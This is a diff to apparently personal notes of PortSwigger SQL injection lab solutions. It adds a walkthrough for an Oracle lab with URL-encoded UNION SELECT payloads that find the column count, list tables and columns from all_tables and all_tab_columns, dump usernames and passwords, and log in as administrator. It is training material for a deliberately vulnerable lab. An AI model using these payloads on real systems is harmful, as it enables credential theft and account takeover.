@@ -143,6 +143,26 @@ There is a built-in table on Oracle called DUAL which you can use for this purpo
    now change the column by user_xxx,password_xxxx.by using `'+UNION+SELECT+username_xxxx,+password_xxxx+FROM+users_xxxx--`
    then search by administrator and get the password
    
-   finally loging using administrator and its password
+   Finally loging using administrator and its password
     
+[10.Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
+
+ 1. *Solutions*
+ 
+   Note that in Oracle every SELECT statement must specify a table to select FROM.
    
+   There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL.
+   
+   By using `'+UNION+SELECT+'abc','xyz'+FROM+DUAL--` we can say the database has tow columns and both have string values.
+   
+   By using `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` will get the name of the table.
+   
+   Then use `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_TJQMGZ'--` to retrieve the usename and password
+   
+   After you get the username and password use payload `'+UNION+SELECT+USERNAME_TZBHEF,PASSWORD_YAKDEJ+FROM+USERS_TJQMGZ--` to get username and password of the administrator
+   
+   Finally loging using administrator and its password
+   
+   
+   
+
